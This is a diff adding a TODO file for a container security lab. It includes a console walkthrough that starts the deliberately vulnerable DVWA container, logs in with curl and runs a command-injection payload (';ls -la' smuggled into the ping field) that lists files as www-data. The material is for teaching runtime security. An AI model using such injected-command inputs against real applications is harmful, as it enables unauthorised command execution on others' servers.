@@ -1,0 +1,40 @@
+# Container Security TODOs
+
+- Add evaluation of the signature and provenance. Also add a signature and provenance to the image and push it as a part of `lab-resources`
+- Dig in further with runtimes; [gVisor](https://github.com/SeisoLLC/ubuntu-sandbox/blob/38c705d8c94595aa84798ce3bd9c5c1a347a55a1/init.sh#L27-L41)?
+- Make use of the below runtime security section. Works on `vulnerables/web-dvwa` but that is 5 years old right now; consider a refactor to work on
+`ghcr.io/digininja/dvwa:latest` which [appears to be the
+latest](https://github.com/digininja/DVWA/blob/39aaaf6c6e5f30a0ab7c151f901455ddd6188ac8/compose.yml#L12)?
+
+## Runtime Security
+
+Let's run a purposefully vulnerable container (DVWA).
+
+```{code-block} console
+$ docker run -d -p 8080:80 vulnerables/web-dvwa
+b981a46f59641685e5c4fa565fd8bd77ab98eca1abfb4306281ee23dede3de37
+$ sleep 2
+$ TOKEN=$(curl -c dvwa.session -s http://127.0.0.1:8080/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
+$ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')
+$ curl -b "PHPSESSID=${PHPSESSID};security=low" -d "username=admin&password=admin&Login=Login&user_token=${TOKEN}" http://127.0.0.1:8080/login.php
+$ sleep 2
+$ TOKEN=$(curl -c dvwa.session -s http://127.0.0.1:8080/setup.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
+$ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')
+$ curl 'http://127.0.0.1:8080/setup.php' -H "Cookie: PHPSESSID=${PHPSESSID}; security=low" --data-raw "create_db=Create+%2F+Reset+Database&user_token=${TOKEN}"
+$ sleep 6
+$ TOKEN=$(curl -c dvwa.session -s http://127.0.0.1:8080/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
+$ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')
+$ curl -s -b "PHPSESSID=${PHPSESSID};security=low" -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://127.0.0.1:8080/login.php
+```
+
+And exploit it.
+
+```{code-block} console
+$ # Exploit
+$ curl -s -L -b "PHPSESSID=${PHPSESSID};security=low" -d 'ip=%3Bls%20-la&Submit=Submit' http://127.0.0.1:8080/vulnerabilities/exec/index.php | grep www-data
+drwxr-xr-x. 1 www-data www-data    49 Oct 12  2018 .
+drwxr-xr-x. 1 www-data www-data 16384 Oct 12  2018 ..
+drwxr-xr-x. 1 www-data www-data    22 Oct 12  2018 help
+-rw-r--r--. 1 www-data www-data  1830 Oct 12  2018 index.php
+drwxr-xr-x. 1 www-data www-data    77 Oct 12  2018 source
+```
